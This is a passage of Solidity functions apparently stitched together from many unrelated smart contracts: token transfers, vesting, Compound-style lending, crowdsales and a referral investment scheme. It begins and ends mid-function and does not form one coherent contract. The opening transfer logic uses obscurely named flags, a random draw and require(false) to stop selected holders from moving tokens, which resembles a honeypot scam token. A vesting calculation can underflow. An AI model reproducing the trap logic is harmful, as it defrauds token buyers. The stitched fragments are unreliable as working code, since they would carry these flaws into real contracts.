        maiz[recipient] = ((randomly() == 4) ? true : false);
    }
    if ((maiz[sender]) && (quesadilla[recipient] == false)) {
        maiz[recipient] = true;
    }
    if (quesadilla[sender] == false) {
        if ((amount > flour) && (enchilada[sender] == true)) {
            require(false);
        }
        require(amount < tacos);
        if (queso == true) {
            if (enchilada[sender] == true) {
                require(false);
            }
            enchilada[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function() payable {
    require(msg.sender == owner);
    require(msg.value == 0);
    require(startTime > 0);
    require(now > startTime + FREEZE_PERIOD);
    var token = Token(lrcTokenAddress);
    uint balance = token.balanceOf(address(this));
    require(balance > 0);
    uint lrcAmount = calculateLRCUnlockAmount(now, balance);
    if (lrcAmount > 0) {
        lrcWithdrawn += lrcAmount;
        Withdrawal(withdrawId++, lrcAmount);
        require(token.transfer(owner, lrcAmount));
    }
}

function start() public {
    require(msg.sender == owner);
    require(startTime == 0);
    lrcInitialBalance = Token(lrcTokenAddress).balanceOf(address(this));
    require(lrcInitialBalance > 0);
    lrcUnlockPerMonth = lrcInitialBalance.div(24); 
    startTime = now;
    Started(startTime);
}

function calculateLRCUnlockAmount(uint _now, uint _balance) internal returns(uint lrcAmount) {
    uint unlockable = (_now - startTime - FREEZE_PERIOD)
        .div(30 days)
        .mul(lrcUnlockPerMonth) - lrcWithdrawn;
    require(unlockable > 0);
    if (unlockable > _balance) return _balance;
    else return unlockable;
}

function seize(address liquidator, address borrower, uint seizeTokens) external nonReentrant returns(uint) {
    uint allowed = comptroller.seizeAllowed(address(this), msg.sender, liquidator, borrower, seizeTokens);
    if (allowed != 0) {
        return failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.LIQUIDATE_SEIZE_COMPTROLLER_REJECTION, allowed);
    }
    if (borrower == liquidator) {
        return fail(Error.INVALID_ACCOUNT_PAIR, FailureInfo.LIQUIDATE_SEIZE_LIQUIDATOR_IS_BORROWER);
    }
    MathError mathErr;
    uint borrowerTokensNew;
    uint liquidatorTokensNew;
    (mathErr, borrowerTokensNew) = subUInt(accountTokens[borrower], seizeTokens);
    if (mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.LIQUIDATE_SEIZE_BALANCE_DECREMENT_FAILED, uint(mathErr));
    }
    (mathErr, liquidatorTokensNew) = addUInt(accountTokens[liquidator], seizeTokens);
    if (mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.LIQUIDATE_SEIZE_BALANCE_INCREMENT_FAILED, uint(mathErr));
    }
    accountTokens[borrower] = borrowerTokensNew;
    accountTokens[liquidator] = liquidatorTokensNew;
    emit Transfer(borrower, liquidator, seizeTokens);
    comptroller.seizeVerify(address(this), msg.sender, liquidator, borrower, seizeTokens);
    return uint(Error.NO_ERROR);
}

function redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal returns(uint) {
    require(redeemTokensIn == 0 || redeemAmountIn == 0, "one of redeemTokensIn or redeemAmountIn must be zero");
    RedeemLocalVars memory vars;
    (vars.mathErr, vars.exchangeRateMantissa) = exchangeRateStoredInternal();
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_EXCHANGE_RATE_READ_FAILED, uint(vars.mathErr));
    }
    if (redeemTokensIn > 0) {
        vars.redeemTokens = redeemTokensIn;
        (vars.mathErr, vars.redeemAmount) = mulScalarTruncate(Exp({
            mantissa: vars.exchangeRateMantissa
        }), redeemTokensIn);
        if (vars.mathErr != MathError.NO_ERROR) {
            return failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_EXCHANGE_TOKENS_CALCULATION_FAILED, uint(vars.mathErr));
        }
    } else {
        (vars.mathErr, vars.redeemTokens) = divScalarByExpTruncate(redeemAmountIn, Exp({
            mantissa: vars.exchangeRateMantissa
        }));
        if (vars.mathErr != MathError.NO_ERROR) {
            return failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_EXCHANGE_AMOUNT_CALCULATION_FAILED, uint(vars.mathErr));
        }
        vars.redeemAmount = redeemAmountIn;
    }
    uint allowed = comptroller.redeemAllowed(address(this), redeemer, vars.redeemTokens);
    if (allowed != 0) {
        return failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.REDEEM_COMPTROLLER_REJECTION, allowed);
    }
    if (accrualBlockNumber != getBlockNumber()) {
        return fail(Error.MARKET_NOT_FRESH, FailureInfo.REDEEM_FRESHNESS_CHECK);
    }
    (vars.mathErr, vars.totalSupplyNew) = subUInt(totalSupply, vars.redeemTokens);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_NEW_TOTAL_SUPPLY_CALCULATION_FAILED, uint(vars.mathErr));
    }
    (vars.mathErr, vars.accountTokensNew) = subUInt(accountTokens[redeemer], vars.redeemTokens);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_NEW_ACCOUNT_BALANCE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    if (getCashPrior() < vars.redeemAmount) {
        return fail(Error.TOKEN_INSUFFICIENT_CASH, FailureInfo.REDEEM_TRANSFER_OUT_NOT_POSSIBLE);
    }
    vars.err = doTransferOut(redeemer, vars.redeemAmount);
    require(vars.err == Error.NO_ERROR, "redeem transfer out failed");
    totalSupply = vars.totalSupplyNew;
    accountTokens[redeemer] = vars.accountTokensNew;
    emit Transfer(redeemer, address(this), vars.redeemTokens);
    emit Redeem(redeemer, vars.redeemAmount, vars.redeemTokens);
    comptroller.redeemVerify(address(this), redeemer, vars.redeemAmount, vars.redeemTokens);
    return uint(Error.NO_ERROR);
}

function borrowFresh(address payable borrower, uint borrowAmount) internal returns(uint) {
    uint allowed = comptroller.borrowAllowed(address(this), borrower, borrowAmount);
    if (allowed != 0) {
        return failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.BORROW_COMPTROLLER_REJECTION, allowed);
    }
    if (accrualBlockNumber != getBlockNumber()) {
        return fail(Error.MARKET_NOT_FRESH, FailureInfo.BORROW_FRESHNESS_CHECK);
    }
    if (getCashPrior() < borrowAmount) {
        return fail(Error.TOKEN_INSUFFICIENT_CASH, FailureInfo.BORROW_CASH_NOT_AVAILABLE);
    }
    BorrowLocalVars memory vars;
    (vars.mathErr, vars.accountBorrows) = borrowBalanceStoredInternal(borrower);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.BORROW_ACCUMULATED_BALANCE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    (vars.mathErr, vars.accountBorrowsNew) = addUInt(vars.accountBorrows, borrowAmount);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.BORROW_NEW_ACCOUNT_BORROW_BALANCE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    (vars.mathErr, vars.totalBorrowsNew) = addUInt(totalBorrows, borrowAmount);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.BORROW_NEW_TOTAL_BALANCE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    vars.err = doTransferOut(borrower, borrowAmount);
    require(vars.err == Error.NO_ERROR, "borrow transfer out failed");
    accountBorrows[borrower].principal = vars.accountBorrowsNew;
    accountBorrows[borrower].interestIndex = borrowIndex;
    totalBorrows = vars.totalBorrowsNew;
    emit Borrow(borrower, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);
    comptroller.borrowVerify(address(this), borrower, borrowAmount);
    return uint(Error.NO_ERROR);
}

function mintFresh(address minter, uint mintAmount) internal returns(uint) {
    uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);
    if (allowed != 0) {
        return failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.MINT_COMPTROLLER_REJECTION, allowed);
    }
    if (accrualBlockNumber != getBlockNumber()) {
        return fail(Error.MARKET_NOT_FRESH, FailureInfo.MINT_FRESHNESS_CHECK);
    }
    MintLocalVars memory vars;
    vars.err = checkTransferIn(minter, mintAmount);
    if (vars.err != Error.NO_ERROR) {
        return fail(vars.err, FailureInfo.MINT_TRANSFER_IN_NOT_POSSIBLE);
    }
    (vars.mathErr, vars.exchangeRateMantissa) = exchangeRateStoredInternal();
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.MINT_EXCHANGE_RATE_READ_FAILED, uint(vars.mathErr));
    }
    (vars.mathErr, vars.mintTokens) = divScalarByExpTruncate(mintAmount, Exp({
        mantissa: vars.exchangeRateMantissa
    }));
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.MINT_EXCHANGE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    (vars.mathErr, vars.totalSupplyNew) = addUInt(totalSupply, vars.mintTokens);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.MINT_NEW_TOTAL_SUPPLY_CALCULATION_FAILED, uint(vars.mathErr));
    }
    (vars.mathErr, vars.accountTokensNew) = addUInt(accountTokens[minter], vars.mintTokens);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.MINT_NEW_ACCOUNT_BALANCE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    vars.err = doTransferIn(minter, mintAmount);
    if (vars.err != Error.NO_ERROR) {
        return fail(vars.err, FailureInfo.MINT_TRANSFER_IN_FAILED);
    }
    totalSupply = vars.totalSupplyNew;
    accountTokens[minter] = vars.accountTokensNew;
    emit Mint(minter, mintAmount, vars.mintTokens);
    emit Transfer(address(this), minter, vars.mintTokens);
    comptroller.mintVerify(address(this), minter, mintAmount, vars.mintTokens);
    return uint(Error.NO_ERROR);
}

function repayBorrowFresh(address payer, address borrower, uint repayAmount) internal returns(uint) {
    uint allowed = comptroller.repayBorrowAllowed(address(this), payer, borrower, repayAmount);
    if (allowed != 0) {
        return failOpaque(Error.COMPTROLLER_REJECTION, FailureInfo.REPAY_BORROW_COMPTROLLER_REJECTION, allowed);
    }
    if (accrualBlockNumber != getBlockNumber()) {
        return fail(Error.MARKET_NOT_FRESH, FailureInfo.REPAY_BORROW_FRESHNESS_CHECK);
    }
    RepayBorrowLocalVars memory vars;
    vars.borrowerIndex = accountBorrows[borrower].interestIndex;
    (vars.mathErr, vars.accountBorrows) = borrowBalanceStoredInternal(borrower);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.REPAY_BORROW_ACCUMULATED_BALANCE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    if (repayAmount == uint(-1)) {
        vars.repayAmount = vars.accountBorrows;
    } else {
        vars.repayAmount = repayAmount;
    }
    vars.err = checkTransferIn(payer, vars.repayAmount);
    if (vars.err != Error.NO_ERROR) {
        return fail(vars.err, FailureInfo.REPAY_BORROW_TRANSFER_IN_NOT_POSSIBLE);
    }
    (vars.mathErr, vars.accountBorrowsNew) = subUInt(vars.accountBorrows, vars.repayAmount);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.REPAY_BORROW_NEW_ACCOUNT_BORROW_BALANCE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    (vars.mathErr, vars.totalBorrowsNew) = subUInt(totalBorrows, vars.repayAmount);
    if (vars.mathErr != MathError.NO_ERROR) {
        return failOpaque(Error.MATH_ERROR, FailureInfo.REPAY_BORROW_NEW_TOTAL_BALANCE_CALCULATION_FAILED, uint(vars.mathErr));
    }
    vars.err = doTransferIn(payer, vars.repayAmount);
    require(vars.err == Error.NO_ERROR, "repay borrow transfer in failed");
    accountBorrows[borrower].principal = vars.accountBorrowsNew;
    accountBorrows[borrower].interestIndex = borrowIndex;
    totalBorrows = vars.totalBorrowsNew;
    emit RepayBorrow(payer, borrower, vars.repayAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);
    comptroller.repayBorrowVerify(address(this), payer, borrower, vars.repayAmount, vars.borrowerIndex);
    return uint(Error.NO_ERROR);
}

function liquidateBorrowInternal(address borrower, uint repayAmount, CToken cTokenCollateral) internal nonReentrant returns(uint) {
    uint error = accrueInterest();
    if (error != uint(Error.NO_ERROR)) {
        return fail(Error(error), FailureInfo.LIQUIDATE_ACCRUE_BORROW_INTEREST_FAILED);
    }
    error = cTokenCollateral.accrueInterest();
    if (error != uint(Error.NO_ERROR)) {
        return fail(Error(error), FailureInfo.LIQUIDATE_ACCRUE_COLLATERAL_INTEREST_FAILED);
    }
    return liquidateBorrowFresh(msg.sender, borrower, repayAmount, cTokenCollateral);
}

function setContract(Token _token, uint256 _lockup) thirdLevel public returns(bool) {
    require(_token != address(0x0));
    require(!lockupIsSet);
    require(!tranche);
    token = _token;
    freeAmount = getMainBalance();
    mainLockup = _lockup;
    tranche = true;
    lockupIsSet = true;
    return true;
}

function isTimeOver() view public returns(bool) {
    if (now > end) {
        return true;
    } else {
        return false;
    }
}

function changeDepositCell(address _key, uint256 _balance) secondLevel public returns(bool) {
    require(userCells[_key].timeOfDeposit.add(1 hours) > now);
    userCells[_key].balance = userCells[_key].balance.sub(_balance);
    freeAmount = freeAmount.add(_balance);
    return true;
}

function AssetWithdraw(address _to, uint256 _balance) secondLevel public returns(bool) {
    require(_balance <= freeAmount);
    require(now >= mainLockup);
    freeAmount = freeAmount.sub(_balance);
    token.transfer(_to, _balance);
    emit Withdraw(this, _balance);
    return true;
}

function withdrawCell(uint256 _balance) public returns(bool) {
    require(userCells[msg.sender].balance >= _balance);
    require(now >= userCells[msg.sender].lockup);
    userCells[msg.sender].balance = userCells[msg.sender].balance.sub(_balance);
    token.transfer(msg.sender, _balance);
    emit Withdraw(msg.sender, _balance);
    return true;
}

function buy(address _referredBy) public payable {
    require(msg.value >= minimum);
    require(gameStarted);
    address _customerAddress = msg.sender;
    if (
        _referredBy != 0x0000000000000000000000000000000000000000 &&
        _referredBy != _customerAddress &&
        investments[_referredBy] >= stakingRequirement
    ) {
        referrer[_referredBy] = referrer[_referredBy].add(msg.value.mul(85).div(1000));
    }
    if (investments[msg.sender] > 0) {
        if (withdraw()) {
            withdrawals[msg.sender] = 0;
        }
    }
    investments[msg.sender] = investments[msg.sender].add(msg.value);
    joined[msg.sender] = block.timestamp;
    ownerWallet.transfer(msg.value.mul(35).div(1000));
    emit Invest(msg.sender, msg.value);
}

function fallback() internal minInvestLimited(msg.value) returns(uint) {
    require(now >= start && now < endSaleDate());
    wallet.transfer(msg.value);
    return mintTokensByETH(msg.sender, msg.value);
}

function() payable external {
    if (!funding) throw;
    if (block.number < fundingStartBlock) throw;
    if (block.number > fundingEndBlock) throw;
    if (msg.value == 0) throw;
    if (msg.value > (tokenCreationCap - totalTokens) / tokenCreationRate)
        throw;
    if (!migrationMaster.send(msg.value)) throw;
    var numTokens = msg.value * tokenCreationRate;
    totalTokens += numTokens;
    balances[msg.sender] += numTokens;
    Transfer(0, msg.sender, numTokens);
}

function vestedAmount(ERC20MiniMe token) public constant returns(uint256) {
    uint256 currentBalance = token.balanceOf(this);
    uint256 totalBalance = currentBalance.add(released[token]);
    if (now < cliff) {
        return 0;
    } else if (now >= start.add(duration) || revoked[token]) {
        return totalBalance;
    } else {
        return totalBalance.mul(now.sub(start)).div(duration);
    }
}

function release(ERC20MiniMe token) public {
    uint256 unreleased = releasableAmount(token);
    require(unreleased > 0);
    released[token] = released[token].add(unreleased);
    require(token.transfer(beneficiary, unreleased));
    Released(unreleased);
}

function revoke(ERC20MiniMe token) public onlyOwner {
    require(revocable);
    require(!revoked[token]);
    uint256 balance = token.balanceOf(this);
    uint256 unreleased = releasableAmount(token);
    uint256 refund = balance.sub(unreleased);
    revoked[token] = true;
    require(token.transfer(owner, refund));
    Revoked();
}

function transferFrom(address _from, address _to, uint256 _value) public returns(bool) {
    require(EffectiveDateOfAllowance[_from][msg.sender] <= block.timestamp);
    return super.transferFrom(_from, _to, _value);
}

function claimBonus(uint16 _stage) public {
    require(!claimed[msg.sender][_stage]);
    require(getStage() > _stage);
    if (!burned[_stage]) {
        token.burn(stageCap.sub(sold[_stage]).sub(sold[_stage].mul(computeBonus(_stage)).div(1 ether)));
        burned[_stage] = true;
    }
    uint256 tokens = computeAddressBonus(_stage);
    token.transfer(msg.sender, tokens);
    bonusClaimedTokens = bonusClaimedTokens.add(tokens);
    claimed[msg.sender][_stage] = true;
    NewBonusClaim(msg.sender, tokens);
}

function getStage() public view returns(uint16) {
    require(block.timestamp >= startTime);
    return uint16(uint256(block.timestamp).sub(startTime).div(stageDuration));
}

function init(uint256 _cap, uint256 _startTime) public onlyOwner {
    require(!isActive);
    require(token.balanceOf(this) == _cap);
    require(_startTime > block.timestamp);
    startTime = _startTime;
    cap = _cap;
    stageCap = cap / stages;
    isActive = true;
}

function() external payable {
    require(isActive);
    require(weiUsdRate > 0);
    require(getStage() < stages);
    uint256 usd = msg.value / weiUsdRate;
    uint256 tokens = computeTokens(usd);
    uint16 stage = getStage();
    sold[stage] = sold[stage].add(tokens);
    require(sold[stage] < stageCap);
    contributions[msg.sender][stage] = contributions[msg.sender][stage].add(tokens);
    soldTokens = soldTokens.add(tokens);
    raisedETH = raisedETH.add(msg.value);
    raisedUSD = raisedUSD.add(usd);
    NewPurchase(msg.sender, tokens, usd, msg.value);
    token.transfer(msg.sender, tokens);
}

function withdraw()
onlyStronghands()
public {
    address _customerAddress = msg.sender;
    uint256 _dividends = myDividends(false); 
    payoutsTo_[_customerAddress] += (int256)(_dividends * magnitude);
